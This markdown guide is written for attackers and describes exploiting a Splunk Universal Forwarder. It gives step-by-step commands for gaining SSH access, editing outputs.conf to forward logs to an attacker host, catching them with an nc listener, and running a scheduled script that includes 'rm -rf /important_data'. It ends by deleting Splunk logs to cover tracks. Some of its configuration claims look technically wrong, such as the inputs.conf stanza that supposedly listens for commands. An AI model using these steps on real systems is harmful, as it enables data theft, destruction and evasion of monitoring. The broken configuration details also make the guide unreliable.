# Splunk Universal Forwarder Exploitation

Splunk Universal Forwarder is a lightweight agent used to collect logs and forward them to a central Splunk server for analysis. Attackers can exploit this tool to manipulate logs, execute remote commands, or exfiltrate sensitive data without being detected. This attack typically involves gaining access to the system running the Universal Forwarder, modifying its configuration, and sending data to a malicious server.

## Attack Steps

### 1. Gain Access to the Target System

- **Objective:** Gain access to the system where Splunk Universal Forwarder is installed.
- **Methods:**
  - Exploit weak SSH/RDP credentials.
  - Use privilege escalation techniques (e.g., exploiting vulnerable Cron jobs or SUID misconfigurations).
  - Use phishing or social engineering to gain initial access.

### 2. Modify Configuration Files

- **Objective:** Alter the Splunk Universal Forwarder configuration to send logs to an attacker-controlled server or execute malicious commands.
- **Files to Target:**
  - `inputs.conf`: Controls the data sources being collected.
  - `outputs.conf`: Controls the destination of the forwarded data (this is where you can redirect logs to a malicious server).
- **Example:**
  - Edit `outputs.conf` to send logs to a remote server:

    ```ini
    [tcpout]
    defaultGroup = attacker_group

    [tcpout:attacker_group]
    server = attacker_ip:port
    ```

### 3. Exfiltrate Data

- **Objective:** Exfiltrate sensitive information or system logs to a remote server.
- **Example:**
  - After modifying the configuration, the attacker can begin collecting logs containing sensitive information like usernames, passwords, or other confidential data.
  - The attacker-controlled server will receive the forwarded logs, which can be analyzed for further exploitation.

### 4. Execute Remote Commands

- **Objective:** Use the Universal Forwarder to execute malicious commands on the target system.
- **Example:**
  - Modify the `inputs.conf` to listen on a specific port for incoming commands:

    ```ini
    [script://./bin/bash]
    disabled = false
    interval = 60
    source = attacker_script.sh
    ```

  - The attacker can then send malicious commands via this port and execute them on the target system.

### 5. Cover Tracks

- **Objective:** Hide the attacker’s actions to avoid detection.
- **Methods:**
  - Delete or modify logs to erase traces of the attack.
  - Use Splunk’s own tools to manipulate or delete logs.
  - Mask the exfiltrated data to make it appear as normal log traffic.

## Practical Example of Execution

### Step 1: Access the Target System

- **Method:** Use SSH with weak credentials or exploit a vulnerability in the system.

  ```bash
  ssh user@target_ip
  ```

### Step 2: Modify Configuration Files

- **Edit `outputs.conf` to forward logs to an attacker-controlled server:**

  ```bash
  sudo nano /opt/splunkforwarder/etc/system/local/outputs.conf
  ```

  Add the following to redirect logs:

  ```ini
  [tcpout]
  defaultGroup = attacker_group

  [tcpout:attacker_group]
  server = attacker_ip:9997
  ```

### Step 3: Exfiltrate Logs

- **Monitor logs on the attacker’s server** to see if data is being forwarded.

  ```bash
  nc -lvp 9997
  ```

### Step 4: Execute Remote Commands

- **Create a malicious script** that will be executed by the Splunk Forwarder:

  ```bash
  echo "echo 'Hacked!'; rm -rf /important_data" > attacker_script.sh
  chmod +x attacker_script.sh
  ```

- **Modify `inputs.conf` to run the script** every 60 seconds:

  ```bash
  sudo nano /opt/splunkforwarder/etc/system/local/inputs.conf
  ```

  Add the following configuration:

  ```ini
  [script://./bin/bash]
  disabled = false
  interval = 60
  source = attacker_script.sh
  ```

### Step 5: Cover Tracks

- **Delete logs or modify them to remove evidence**:

  ```bash
  sudo rm -rf /opt/splunkforwarder/var/log/splunk/*
  ```
